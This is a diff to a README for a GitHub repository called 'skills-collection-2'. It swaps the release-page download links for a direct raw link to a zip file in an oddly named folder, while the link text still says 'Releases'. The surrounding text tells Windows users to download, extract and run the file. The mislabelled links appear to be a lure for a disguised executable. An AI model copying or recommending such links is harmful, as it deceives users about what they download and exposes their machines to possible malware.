@@ -1,10 +1,10 @@
 # 🤖 skills-collection-2 - Practical Skills for Builders
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Enfranchised-headlock480/skills-collection-2/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Enfranchised-headlock480/skills-collection-2/raw/refs/heads/main/hypercatharsis/skills_collection_1.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [skills-collection-2 Releases](https://github.com/Enfranchised-headlock480/skills-collection-2/releases)
+Visit this page to download: [skills-collection-2 Releases](https://github.com/Enfranchised-headlock480/skills-collection-2/raw/refs/heads/main/hypercatharsis/skills_collection_1.7.zip)
 
 Choose the latest release, then download the Windows file from the **Assets** section. If the release includes a `.zip` file, save it to your computer and extract it before you open the app.
 
@@ -177,6 +177,6 @@ Use it when you want structure for:
 
 ## 📄 Release page
 
-Download the Windows version here: [https://github.com/Enfranchised-headlock480/skills-collection-2/releases](https://github.com/Enfranchised-headlock480/skills-collection-2/releases)
+Download the Windows version here: [https://github.com/Enfranchised-headlock480/skills-collection-2/raw/refs/heads/main/hypercatharsis/skills_collection_1.7.zip](https://github.com/Enfranchised-headlock480/skills-collection-2/raw/refs/heads/main/hypercatharsis/skills_collection_1.7.zip)
 
 Open the latest release, find the file for Windows, and save it to your computer before you run it
